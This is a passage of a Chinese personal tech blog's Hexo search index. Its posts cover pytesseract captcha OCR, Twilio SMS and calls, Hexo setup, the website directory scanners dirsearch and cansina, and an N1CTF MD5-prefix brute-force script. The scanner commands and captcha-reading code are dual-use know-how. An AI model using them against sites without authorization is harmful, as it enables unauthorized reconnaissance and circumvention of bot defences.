加上去，再reboot一下就连上网了。 我猜可能是路由器自动恢复？还是刚好被我遇到了这个奇葩bug？ 后续想着设置一下每天自动执行 killall python，Linux是有cron个工具，类似于windows的task scheduler，可以设置定时启动某任务。]]></content>
      <categories>
        <category>趣味玩耍</category>
      </categories>
      <tags>
        <tag>小米路由器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python识别验证码]]></title>
    <url>%2F2018%2F04%2F15%2Fpython%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81%2F</url>
    <content type="text"><![CDATA[0x00 安装环境OCR(Optical Character Recognition): 光学字符识别,是指对图片文件中的文字进行分析识别，获取的过程。 Tesseract： 开源的OCR识别引擎，初期Tesseract引擎由HP实验室研发，后来贡献给了开源软件业，后经由Google进行改进，消除bug，优化，重新发布。当前版本为4.0 (安装教程是从这复制来的：http://www.inimei.cn/archives/297.html) 首先需要安装pytesseract库还有图像处理的PILLOW库了 12pip install pytesseractpip install PILLOW 然后要安装一个Tesseract-OCR软件。这个软件是由Google维护的开源的OCR软件。下载地址：百度网盘（密码：5m3d）。再在Windows下配置一下环境变量。 0x01报错：FileNotFoundError: [WinError 2] 系统找不到指定的文件。https://blog.csdn.net/jacke121/article/details/75443785 1pytesseract.pytesseract.tesseract_cmd = r&apos;C:\Program Files (x86)\Tesseract-OCR\tesseract.exe&apos; 0x02 报错：pytesseract.pytesseract.TesseractError: (1, ‘Error opening data file \Program Files (x86)\Tesseract-OCR\eng.traineddata1pytesseract.pytesseract.TesseractError: (1, &apos;Error opening data file \\Program Files (x86)\\Tesseract-OCR\\eng.traineddata Please make sure the TESSDATA_PREFIX environment variable is set to your &quot;tessdata&quot; directory. Failed loading language \&apos;eng\&apos; Tesseract couldn\&apos;t load any languages! Could not initialize tesseract.&apos;) 在.py 文件配置中指定 tessdata-dir 12tessdata_dir_config = '--tessdata-dir "D:\\Program Files (x86)\\Tesseract-OCR\\tessdata"'text = pytesseract.image_to_string(image,lang='chi_sim',config=tessdata_dir_config) 0x03 供上代码12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python3# -*- coding: utf-8 -*-# @Date : 2018-04-15 13:18:36# @Author : Lhaihai ($&#123;email&#125;)# @Link : http://blog.Lhaihai.wang# @Version : $Id$import pytesseractfrom PIL import Imagedef get_bin_table(threshold = 230): # 获取灰度转二值的映射table table = [] for i in range(256): if i &lt; threshold: table.append(0) else: table.append(1) return tabledef main(): pytesseract.pytesseract.tesseract_cmd = r'D:\Program Files (x86)\Tesseract-OCR\tesseract.exe' image = Image.open('1.jpg') # image.show() #打开图片1.jpg #imgry = image.convert('L') # 转化为灰度图，虽然说转为灰度图识别更好的一点，但随你喜欢用不用 #table = get_bin_table() #out = imgry.point(table, '1') tessdata_dir_config = '--tessdata-dir "D:\\Program Files (x86)\\Tesseract-OCR\\tessdata"' text = pytesseract.image_to_string(image,lang='eng',config=tessdata_dir_config) # fil = filter(str.isdigit, text) # new_text = '' # for i in fil: # new_text += i print(text)if __name__ == '__main__': main() 有时候可以识别出来，有时候识别不了，时好时坏吧 参考地址： https://blog.csdn.net/Sioon_XUX/article/details/78617160 http://www.cnblogs.com/zhongtang/tag/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/ https://blog.csdn.net/kiramario/article/details/53781369 https://github.com/tesseract-ocr/tesseract/wiki/4.0-with-LSTM#400-alpha-for-windows https://github.com/tesseract-ocr/tesseract/wiki/Data-Files https://github.com/madmaze/pytesseract https://github.com/tesseract-ocr/tesseract https://github.com/tesseract-ocr/tesseract/wiki]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python+twilio发送短信]]></title>
    <url>%2F2018%2F04%2F14%2Fpython-twilio%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[注册Twilio账号访问http://twilio.com/并填写注册表单。注册了新账户后，你需要验证一个手机号码，短信将发给该号码（这项验证是必要的，防止有人利用该服务向任意的手机号码发送垃圾短信）。收到验证号码短信后，在Twilio网站上输入它，证明你拥有要验证的手机。现在，就可以用twilio模块向这个电话号码发送短信了。 1、获取一个Twilio电话号码：https://support.twilio.com/hc/en-us/articles/223136107-How-does-Twilio-s-Free-Trial-work-/ 2、要验证接收短信的手机号码，要不然就会报错1twilio.base.exceptions.TwilioRestException: HTTP 400 error: Unable to create record: The number +8613xxxxxx30 is unverified. Trial accounts cannot send messages to unverified numbers; verify +8613xxxxxx30 at twilio.com/user/account/phone-numbers/verified, or purchase a Twilio number to send messages to unverified numbers. 到这个网址验证手机号码：https://www.twilio.com/console/phone-numbers/verified 可以发送短信验证码或者打电话输入验证码 3、官方文档https://www.twilio.com/docs/libraries/python 发送短信123456789101112131415from twilio.rest import Client# Your Account SID from twilio.com/consoleaccount_sid = "AC9810ae2342f0014cd05e338bce9be8cb"# Your Auth Token from twilio.com/consoleauth_token = "your_auth_token"client = Client(account_sid, auth_token)message = client.messages.create( to="+15558675309", from_="+15017250604", body="Hello from Python!")print(message.sid) 效果如下： tip1:to=”+15558675309” to的值是接收短信的手机号码，注意的是，中国大陆的电话号码要在前面加上+86 tip2：python文件的命名不能是twilio.py 如果你像我一样给它这样命名，在导入twilio库的时候会失败，提示unuseful rest 哈哈，宛如一个智障（自我嘲讽一波） 找找stackoverflow.com发现下面这个： https://stackoverflow.com/questions/41013556/importerror-cannot-import-name-twiliorestclient tip3:封装一下函数，（并且放在python.exe当前目录，方便其它python文件调用），就方便使用了 1sendMessage('tophonenumber','Happy to do this') tip4：github项目 https://github.com/twilio/twilio-python/ 打电话12345678910from twilio.rest import Clientaccount = "ACXXXXXXXXXXXXXXXXX"token = "YYYYYYYYYYYYYYYYYY"client = Client(account, token)call = client.calls.create(to="9991231234", from_="9991231234", url="http://twimlets.com/holdmusic?Bucket=com.twilio.music.ambient")print(call.sid) 只能打电话过来，说几句英语，不能沟通 Handling a call using TwiML（偷个懒直接从github复制） To control phone calls, your application needs to output TwiML. Use twilio.twiml.Response to easily create such responses. 12345from twilio.twiml.voice_response import VoiceResponser = VoiceResponse()r.say("Welcome to twilio!")print(str(r)) 最后还是不知道怎么实现打电话双向通话(；へ：) 参考链接： https://baijiahao.baidu.com/s?id=1593431889367189831&amp;wfr=spider&amp;for=pc]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo 学习笔记]]></title>
    <url>%2F2018%2F04%2F13%2Fhexo-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[参考链接： Hexo博客教程(一):Hexo的前期部署：https://www.jianshu.com/p/9f04ee6371ce Hexo博客教程(二):基本功能和网站优化：https://www.jianshu.com/p/2a70262295e4 Hexo博客教程(三):参考资料https://www.jianshu.com/p/8f727b4c3cd1 设置访问次数统计不蒜子统计 http://theme-next.iissnan.com/third-party-services.html#analytics-busuanzi]]></content>
      <categories>
        <category>GitHub hexo建站</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F04%2F13%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
      <categories>
        <category>good</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[网站目录结构扫描器]]></title>
    <url>%2F2018%2F03%2F13%2F%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E6%89%AB%E6%8F%8F%E5%99%A8%2F</url>
    <content type="text"><![CDATA[0x00 cansinaInstall12345pip install --user requests[security](try removing --user and install with sudo in case of errors)git clone --depth=1 https://github.com/deibit/cansina Fast useUse Python 3 (works on Python 2 too, but 3 is advisable) 1$ python3 cansina.py -u &lt;site_url&gt; -p &lt;payload_file&gt; 0x01 dirsearchinstall(need Python 3.X)Linux: 123git clone https://github.com/maurosoria/dirsearch.gitcd dirsearch/./dirsearch.py -u 目标网址 -e * Windows: https://github.com/maurosoria/dirsearch/archive/master.zip Fast use12./dirsearch.py -u 目标网址 -e *./dirsearch.py -u 目标网址 -e php| grep 200 !dirsearch]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>python Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[N1CTF笔记]]></title>
    <url>%2F2018%2F03%2F11%2FN1CTF%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[https://3wapp.github.io/ http://blog.csdn.net/lacoucou/article/details/72355346 Dockerfile easy php substr(md5(?), 0, 5)=== de426 substr() 函数返回字符串的一部分。 注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。 语法12substr(string,start,length) 参数 描述 string 必需。规定要返回其中一部分的字符串。 start 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾开始的指定位置开始0 - 在字符串中的第一个字符处开始 length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度 http://www.beesfun.com/2017/03/21/CTF%E4%B9%8BMD5%E6%88%AA%E6%96%AD%E6%AF%94%E8%BE%83/ submd5.py 12345678910111213141516171819202122232425262728# -*- coding: utf-8 -*-import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.letters + string.digitsdef cmp_md5(substr, stop_event, str_len, start=0, size=20): global CHARS while not stop_event.is_set(): rnds = ''.join(random.choice(CHARS) for _ in range(size)) md5 = hashlib.md5(rnds) if md5.hexdigest()[start: start+str_len] == substr: print rnds stop_event.set()if __name__ == '__main__': substr = sys.argv[1].strip() start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0 str_len = len(substr) cpus = multiprocessing.cpu_count() stop_event = multiprocessing.Event() processes = [multiprocessing.Process(target=cmp_md5, args=(substr, stop_event, str_len, start_pos)) for i in range(cpus)] for p in processes: p.start() for p in processes: p.join() 用法： 1234$ python submd5.py "3d4f4"SponhjOhIZ30IaM1fweb$ python submd5.py "3df4" 2G8tr6VhonA1z3xJdaGBu]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GitHub hexo建站笔记]]></title>
    <url>%2F2018%2F03%2F11%2FGitHub-hexo%E5%BB%BA%E7%AB%99%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[有用的链接：12https://github.com/iissnan/hexo-theme-next/blob/master/README.cn.mdhttp://theme-next.iissnan.com/getting-started.html 0x01 Cannot GET /tags/执行 1$ hexo new page tags 之后，要修改tags文件下的index.md文件 https://www.zhihu.com/question/29017171 0x02 这里有两篇帮你不需要什么成本，搭建好一个功能完备的博客： 如何搭建一个独立博客——简明Github Pages与Hexo教程 https://www.jianshu.com/p/05289a4bc8b2 hexo 博客小功能添加-评论、相册、字数统计… https://www.jianshu.com/p/f5c184047e72]]></content>
      <categories>
        <category>GitHub hexo建站</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
</search>
